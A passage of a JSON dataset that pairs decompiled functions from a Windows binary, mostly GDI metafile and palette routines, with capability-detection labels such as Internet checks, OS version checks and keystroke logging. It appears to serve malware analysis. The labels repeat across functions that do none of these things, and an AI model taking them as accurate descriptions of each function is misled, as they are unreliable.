fcn.00403a40();\n        piStack104[4] = iVar1;\n        var_4h[7] = in_EAX;\n        piStack104 = var_4h;\n        uStack108 = 0x429206;\n        iVar1 = fcn.00403a40();\n        piStack104[6] = iVar1;\n    }\n    piStack104 = 0x429219;\n    fcn.00403a28();\n    *in_FS_OFFSET = uStack100;\n    puStack92 = 0x429236;\n    uStack96 = 0x42922e;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 597
    },
    "0042929c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0042929c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char cVar3;\n    bool bVar4;\n    \n    iVar1 = *(*(arg_8h + -4) + 0x20);\n    if (iVar1 == 0) {\n        bVar4 = *(*(arg_8h + -8) + 0xc) != 0;\n    }\n    else {\n        bVar4 = true;\n        cVar3 = fcn.004039b8();\n        if (cVar3 != '\\0') {\n            if ((*(*(arg_8h + -8) + 0xc) == *(iVar1 + 0xc)) ||\n               (((piVar2 = *(*(arg_8h + -8) + 0xc),  piVar2 != NULL && (*(iVar1 + 0xc) != 0)) &&\n                (cVar3 = (**(*piVar2 + 0x18))(),  cVar3 != '\\0')))) {\n                bVar4 = false;\n            }\n            else {\n                bVar4 = true;\n            }\n        }\n    }\n    return bVar4;\n}\n",
        "token_count": 267
    },
    "0042946c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042946c(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint uStack84;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_24h;\n    uint var_20h;\n    uint var_10h;\n    int32_t hdcRef;\n    int32_t var_5h;\n    \n    if (in_DL != '\\0') {\n        puStack72 = 0x429486;\n        in_EAX = fcn.00403b58();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    uStack76 = 0x429681;\n    iStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    uStack84 = 0x4294ac;\n    puStack72 = &stack0xfffffffc;\n    var_5h._0_1_ = in_DL;\n    unique0x10000220 = in_EAX;\n    fcn.00426a54();\n    *(stack0xfffffff8 + 0x58) = in_ECX;\n    hdcRef = arg_10h;\n    if (arg_10h == 0) {\n        uStack84 = 0;\n        puStack88 = 0x4294c5;\n        hdcRef = sub.user32.dll_GetDC();\n    }\n    uStack92 = 0x429664;\n    iStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    puStack88 = &stack0xfffffffc;\n    iVar1 = fcn.00429a28();\n    if (iVar1 == 0) {\n        iVar1 = (**(**(stack0xfffffff8 + 0x58) + 0x2c))();\n        if (iVar1 == 0) {\n            uStack92 = 4;\n            iStack96 = hdcRef;\n            sub.gdi32.dll_GetDeviceCaps();\n            fcn.0042a088();\n        }\n        else {\n            uStack92 = 8;\n            iStack96 = hdcRef;\n            uVar2 = sub.gdi32.dll_GetDeviceCaps();\n            iVar1 = sub.gdi32.dll_GetDeviceCaps(hdcRef, 4, uVar2);\n            iStack96 = (**(**(stack0xfffffff8 + 0x58) + 0x2c))(iVar1 * 100);\n            sub.kernel32.dll_MulDiv();\n            fcn.0042a088();\n        }\n    }\n    iVar1 = fcn.00429a10();\n    if (iVar1 == 0) {\n        iVar1 = (**(**(stack0xfffffff8 + 0x58) + 0x20))();\n        if (iVar1 == 0) {\n            uStack92 = 6;\n            iStack96 = hdcRef;\n            sub.gdi32.dll_GetDeviceCaps();\n            fcn.0042a04c();\n        }\n        else {\n            uStack92 = 10;\n            iStack96 = hdcRef;\n            uVar2 = sub.gdi32.dll_GetDeviceCaps();\n            iVar1 = sub.gdi32.dll_GetDeviceCaps(hdcRef, 6, uVar2);\n            iStack96 = (**(**(stack0xfffffff8 + 0x58) + 0x20))(iVar1 * 100);\n            sub.kernel32.dll_MulDiv();\n            fcn.0042a04c();\n        }\n    }\n    uVar2 = fcn.00429a10();\n    arg_8h_00 = &fcn.0042946c::var_20h;\n    fcn.00429a28();\n    fcn.0041b080(arg_8h_00, uVar2);\n    iVar1 = fcn.00404888();\n    if (iVar1 < 1) {\n        iVar1 = fcn.00404888();\n        if (iVar1 < 1) {\n            var_10h = 0;\n            goto code_r0x0042961d;\n        }\n    }\n    fcn.00404948(0x4296c0, arg_8h, 0x4296b4, arg_ch);\n    var_10h = fcn.00404a88();\ncode_r0x0042961d:\n    iVar1 = hdcRef;\n    iVar3 = sub.gdi32.dll_CreateEnhMetaFileA(hdcRef, 0, &fcn.0042946c::var_20h, var_10h);\n    if (iVar3 == 0) {\n        fcn.0042739c();\n    }\n    fcn.004270cc();\n    *in_FS_OFFSET = iVar1;\n    if (arg_10h == 0) {\n        sub.user32.dll_ReleaseDC(0, hdcRef, 0x42966b);\n    }\n    return;\n}\n",
        "token_count": 1172
    },
    "004298ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004298ac(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    fcn.004045c8();\n    iVar1 = *(in_EAX + 0x28);\n    if ((iVar1 != 0) && (*(iVar1 + 8) != 0)) {\n        iVar1 = sub.gdi32.dll_GetEnhMetaFileDescriptionA(*(iVar1 + 8), 0, 0);\n        if (0 < iVar1) {\n            fcn.00404c14();\n            uVar2 = fcn.00404a88();\n            sub.gdi32.dll_GetEnhMetaFileDescriptionA(*(*(in_EAX + 0x28) + 8), iVar1, uVar2);\n            fcn.00404a88();\n            fcn.0040928c();\n            fcn.00404c14();\n        }\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "00429914": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00429914(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    fcn.004045c8();\n    iVar1 = *(in_EAX + 0x28);\n    if ((iVar1 != 0) && (*(iVar1 + 8) != 0)) {\n        iVar1 = sub.gdi32.dll_GetEnhMetaFileDescriptionA(*(iVar1 + 8), 0, 0);\n        if (0 < iVar1) {\n            fcn.00404c14();\n            uVar2 = fcn.00404a88();\n            sub.gdi32.dll_GetEnhMetaFileDescriptionA(*(*(in_EAX + 0x28) + 8), iVar1, uVar2);\n            fcn.00404a88();\n            fcn.0040928c();\n            fcn.00404b28();\n            fcn.00404a88();\n            fcn.0040928c();\n            fcn.00404c14();\n        }\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "00429a10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00429a10(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        fcn.00429b84();\n    }\n    return *(*(in_EAX + 0x28) + 0x10);\n}\n",
        "token_count": 69
    },
    "00429a28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00429a28(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        fcn.00429b84();\n    }\n    return *(*(in_EAX + 0x28) + 0xc);\n}\n",
        "token_count": 68
    },
    "00429ce8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00429ce8(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack180;\n    uint uStack176;\n    uchar *puStack172;\n    uint lpemh;\n    uint var_76h;\n    uint var_72h;\n    uint var_32h;\n    uint var_2eh;\n    uint var_2ah;\n    uint var_26h;\n    int32_t var_22h;\n    uint var_1ch;\n    uint nNumber;\n    uint nDenominator;\n    int16_t var_eh;\n    uint lpbBuffer;\n    int32_t cbBuffer;\n    int32_t *var_4h;\n    \n    puStack172 = 0x429d03;\n    var_4h = param_2;\n    fcn.00429b84();\n    puStack172 = 0x429d13;\n    (**(*var_4h + 0xc))();\n    if (var_22h == -0x65393229) {\n        puStack172 = 0x429d24;\n        iVar2 = fcn.004281ac();\n        if (iVar2 == var_eh) goto code_r0x00429d2f;\n    }\n    puStack172 = 0x429d2f;\n    fcn.0042733c();\ncode_r0x00429d2f:\n    cbBuffer = cbBuffer + -0x16;\n    puStack172 = 0x429d3b;\n    lpbBuffer = fcn.00402b14();\n    iVar1 = *(in_EAX + 0x28);\n    uStack176 = 0x429e57;\n    iStack180 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff4c;\n    puStack172 = &stack0xfffffffc;\n    (**(*var_4h + 0xc))();\n    *(*(in_EAX + 0x28) + 0x18) = nDenominator;\n    if (nDenominator == 0) {\n        nDenominator._0_2_ = 0x60;\n    }\n    uVar3 = sub.kernel32.dll_MulDiv(nNumber - var_1ch, 0x9ec, nDenominator);\n    *(iVar1 + 0xc) = uVar3;\n    uVar3 = sub.kernel32.dll_MulDiv(nNumber._2_2_ - var_1ch._2_2_, 0x9ec, nDenominator);\n    *(iVar1 + 0x10) = uVar3;\n    var_32h = 8;\n    var_2eh = 0;\n    var_2ah = 0;\n    var_26h = 0;\n    iVar4 = sub.gdi32.dll_SetWinMetaFileBits(cbBuffer, lpbBuffer, 0, &fcn.00429ce8::var_32h);\n    *(iVar1 + 8) = iVar4;\n    if (iVar4 == 0) {\n        fcn.0042733c();\n    }\n    sub.gdi32.dll_GetEnhMetaFileHeader(*(iVar1 + 8), 100, &fcn.00429ce8::lpemh);\n    var_32h = 8;\n    var_2eh = var_76h;\n    var_2ah = var_72h;\n    var_26h = 0;\n    sub.gdi32.dll_DeleteEnhMetaFile(*(iVar1 + 8));\n    iVar4 = cbBuffer;\n    iVar5 = sub.gdi32.dll_SetWinMetaFileBits(cbBuffer, lpbBuffer, 0, &fcn.00429ce8::var_32h);\n    *(iVar1 + 8) = iVar5;\n    if (iVar5 == 0) {\n        fcn.0042733c();\n    }\n    *(in_EAX + 0x2c) = 0;\n    *in_FS_OFFSET = iVar4;\n    fcn.00402b44(0x429e5e);\n    return;\n}\n",
        "token_count": 942
    },
    "0042a04c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a04c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (in_EAX[10] == 0) {\n        fcn.00429b84();\n    }\n    iVar1 = in_EAX[10];\n    *(iVar1 + 0x20) = 0;\n    if (param_2 != *(iVar1 + 0x10)) {\n        fcn.0042a19c();\n        *(in_EAX[10] + 0x10) = param_2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "0042a088": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a088(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (in_EAX[10] == 0) {\n        fcn.00429b84();\n    }\n    iVar1 = in_EAX[10];\n    *(iVar1 + 0x1c) = 0;\n    if (param_2 != *(iVar1 + 0xc)) {\n        fcn.0042a19c();\n        *(in_EAX[10] + 0xc) = param_2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "0042a13c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042a13c(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack112;\n    int32_t iStack72;\n    \n    iVar1 = (***param_2)();\n    iVar2 = fcn.0041e990();\n    if (100 < iVar1 - iVar2) {\n        (**(*param_2 + 0xc))();\n        (**(*param_2 + 0x14))();\n        if ((iStack112 == 1) && (iStack72 == 0x464d4520)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 156
    },
    "0042a19c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042a19c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        fcn.00429b84();\n    }\n    else if (1 < *(*(in_EAX + 0x28) + 4)) {\n        iVar2 = fcn.004037f0();\n        iVar1 = *(*(in_EAX + 0x28) + 8);\n        if (iVar1 != 0) {\n            uVar3 = sub.gdi32.dll_CopyEnhMetaFileA(iVar1, 0);\n            *(iVar2 + 8) = uVar3;\n        }\n        *(iVar2 + 0x10) = *(*(in_EAX + 0x28) + 0x10);\n        *(iVar2 + 0xc) = *(*(in_EAX + 0x28) + 0xc);\n        *(iVar2 + 0x18) = *(*(in_EAX + 0x28) + 0x18);\n        *(iVar2 + 0x1c) = *(*(in_EAX + 0x28) + 0x1c);\n        *(iVar2 + 0x20) = *(*(in_EAX + 0x28) + 0x20);\n        fcn.0042a904();\n        *(in_EAX + 0x28) = iVar2;\n        fcn.0042a900();\n    }\n    return;\n}\n",
        "token_count": 349
    },
    "0042a2a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042a2a0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint cbBuffer;\n    uint lpbBuffer;\n    \n    if (*(in_EAX + 0x28) != 0) {\n        uStack24 = 0;\n        uStack28 = 0;\n        uStack32 = *(*(in_EAX + 0x28) + 8);\n        puStack36 = 0x42a2c0;\n        iVar1 = sub.gdi32.dll_GetEnhMetaFileBits();\n        if (iVar1 != 0) {\n            puStack36 = 0x42a2d1;\n            uVar2 = fcn.00402b14();\n            uStack40 = 0x42a31c;\n            uStack44 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd4;\n            uVar3 = *(*(in_EAX + 0x28) + 8);\n            puStack36 = &stack0xfffffffc;\n            sub.gdi32.dll_GetEnhMetaFileBits(uVar3, iVar1, uVar2);\n            fcn.0041ebf4();\n            *in_FS_OFFSET = uVar3;\n            fcn.00402b44(0x42a323);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 351
    },
    "0042a32c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0042a32c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint *in_FS_OFFSET;\n    uint uVar6;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint32_t uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint32_t uStack56;\n    uint uStack52;\n    uint var_22h;\n    uint var_18h;\n    uint nNumerator;\n    uint var_eh;\n    uint cbBuffer;\n    uint lpbBuffer;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        return;\n    }\n    uStack52 = 0x42a351;\n    fcn.004031a8();\n    iVar1 = *(in_EAX + 0x28);\n    nNumerator._0_2_ = *(iVar1 + 0x18);\n    if (nNumerator == 0) {\n        nNumerator._0_2_ = 0x60;\n    }\n    uStack52 = 0x9ec;\n    uStack56 = nNumerator;\n    uStack60 = *(iVar1 + 0xc);\n    uStack64 = 0x42a383;\n    sub.kernel32.dll_MulDiv();\n    uStack64 = 0x9ec;\n    uStack68 = nNumerator;\n    uStack72 = *(iVar1 + 0x10);\n    uStack76 = 0x42a39a;\n    sub.kernel32.dll_MulDiv();\n    uStack76 = 0x42a3a6;\n    fcn.004281ac();\n    uStack76 = 0;\n    puStack80 = 0x42a3b1;\n    uVar2 = sub.user32.dll_GetDC();\n    uStack84 = 0x42a467;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    uStack96 = 8;\n    uStack100 = 0;\n    uStack104 = 0;\n    uStack108 = *(iVar1 + 8);\n    puStack112 = 0x42a3d5;\n    uStack92 = uVar2;\n    puStack80 = &stack0xfffffffc;\n    uVar3 = sub.gdi32.dll_GetWinMetaFileBits();\n    puStack112 = 0x42a3e0;\n    uVar4 = fcn.00402b14();\n    uStack116 = 0x42a447;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    uVar6 = *(iVar1 + 8);\n    puStack112 = &stack0xfffffffc;\n    uVar5 = sub.gdi32.dll_GetWinMetaFileBits(uVar6, uVar3, uVar4, 8, uVar2);\n    if (uVar5 < uVar3) {\n        fcn.0042739c();\n    }\n    fcn.0041ebf4();\n    fcn.0041ebf4();\n    *in_FS_OFFSET = uVar6;\n    fcn.00402b44(0x42a44e);\n    return;\n}\n",
        "token_count": 813
    },
    "0042a5e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042a5e4(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x42a5f4;\n    var_8h = fcn.0041c8b0();\n    uStack24 = 0x42a682;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar2 = *(var_8h + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            var_4h = iVar2;\n            puStack32 = 0x42a61f;\n            var_ch = fcn.0041c4c8();\n            puStack32 = 0x42a62a;\n            cVar1 = fcn.00426ee8();\n            if (cVar1 != '\\0') {\n                uStack36 = 0x42a65a;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack32 = &stack0xfffffffc;\n                fcn.0042a774();\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x42a661;\n                uStack36 = 0x42a659;\n                fcn.00426f44();\n                return;\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x42a689;\n    uStack24 = 0x42a681;\n    fcn.0041c914();\n    return;\n}\n",
        "token_count": 462
    },
    "0042a690": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042a690(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        puStack20 = 0x42a6a9;\n        iVar1 = fcn.0041c8b0();\n        uStack24 = 0x42a700;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        iVar1 = *(iVar1 + 8) + -1;\n        puStack20 = &stack0xfffffffc;\n        if (-1 < iVar1) {\n            do {\n                iVar2 = fcn.0041c4c8();\n                if ((*(iVar2 + 0x58) != 0) && (*(*(*(iVar2 + 0x58) + 0x28) + 8) == in_EAX)) {\n                    fcn.0042a774();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x42a707;\n        uStack24 = 0x42a6ff;\n        fcn.0041c914();\n        return;\n    }\n    return;\n}\n",
        "token_count": 324
    },
    "0042a774": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042a774(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 4) != 0) {\n        puStack16 = 0x42a791;\n        fcn.00426d58();\n        uStack20 = 0x42a808;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        if (*(in_EAX + 0x5c) != 0) {\n            puStack16 = &stack0xfffffffc;\n            sub.gdi32.dll_SelectObject(*(in_EAX + 4), *(in_EAX + 0x5c));\n        }\n        if (*(in_EAX + 0x60) != 0) {\n            sub.gdi32.dll_SelectPalette(*(in_EAX + 4), *(in_EAX + 0x60), 0xffffffff);\n        }\n        uVar1 = *(in_EAX + 4);\n        fcn.004270cc();\n        sub.gdi32.dll_DeleteDC();\n        fcn.0041c8c4();\n        *in_FS_OFFSET = uVar1;\n        fcn.00426f44(0x42a80f);\n        return;\n    }\n    return;\n}\n",
        "token_count": 325
    },
    "0042a814": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042a814(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x58) != 0) {\n        puStack20 = 0x42a832;\n        fcn.00426d58();\n        uStack24 = 0x42a8f3;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        fcn.0042bb38();\n        fcn.0042a690();\n        fcn.0042bc38();\n        uVar2 = sub.gdi32.dll_CreateCompatibleDC(0);\n        iVar1 = *(*(*(in_EAX + 0x58) + 0x28) + 8);\n        if (iVar1 == 0) {\n            *(in_EAX + 0x5c) = 0;\n        }\n        else {\n            in_stack_ffffffd8 = uVar2;\n            uVar3 = sub.gdi32.dll_SelectObject(uVar2, iVar1);\n            *(in_EAX + 0x5c) = uVar3;\n        }\n        iVar1 = *(*(*(in_EAX + 0x58) + 0x28) + 0x10);\n        if (iVar1 == 0) {\n            *(in_EAX + 0x60) = 0;\n        }\n        else {\n            uVar3 = sub.gdi32.dll_SelectPalette(uVar2, iVar1, 0xffffffff);\n            *(in_EAX + 0x60) = uVar3;\n            sub.gdi32.dll_RealizePalette(uVar2);\n        }\n        fcn.004270cc();\n        fcn.0041c828();\n        *in_FS_OFFSET = in_stack_ffffffd8;\n        fcn.00426f44(0x42a8fa);\n        return;\n    }\n    return;\n}\n",
        "token_count": 483
    },
    "0042a904": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042a904(void)\n\n{\n    uint *in_EAX;\n    \n    if ((in_EAX != NULL) && (in_EAX[1] = in_EAX[1] + -1,  in_EAX[1] == 0)) {\n        (***in_EAX)();\n        fcn.00403820();\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "0042aa88": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042aa88(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x28) & 3) != 0) && (*(in_EAX + 0x40) == 0)) {\n        if (*(in_EAX + 0x26) == 0x10) {\n            *(in_EAX + 0x40) = 0xf800;\n            *(in_EAX + 0x44) = 0x7e0;\n            *(in_EAX + 0x48) = 0x1f;\n        }\n        else if (*(in_EAX + 0x26) == 0x20) {\n            *(in_EAX + 0x40) = 0xff0000;\n            *(in_EAX + 0x44) = 0xff00;\n            *(in_EAX + 0x48) = 0xff;\n        }\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "0042aad4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042aad4(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uchar *puVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t in_EDX;\n    uint32_t uVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t *in_FS_OFFSET;\n    uint *puStack312;\n    int32_t iStack308;\n    uchar *puStack304;\n    int32_t iStack300;\n    int32_t iStack296;\n    int32_t iStack292;\n    uint *puStack288;\n    int32_t iStack272;\n    int32_t iStack268;\n    uchar *puStack264;\n    uint *puStack260;\n    int32_t iStack256;\n    int32_t iStack252;\n    uint *puStack248;\n    code *pcStack244;\n    uint *puStack240;\n    uchar *puStack236;\n    int32_t iStack232;\n    int32_t iStack228;\n    uchar *puStack224;\n    int32_t iStack220;\n    uint uStack216;\n    int32_t iStack212;\n    uint uStack208;\n    uchar *puStack204;\n    int32_t iStack200;\n    uint uStack196;\n    uchar *puStack192;\n    int32_t iStack188;\n    uint uStack184;\n    int32_t iStack180;\n    uint uStack176;\n    uint *puStack172;\n  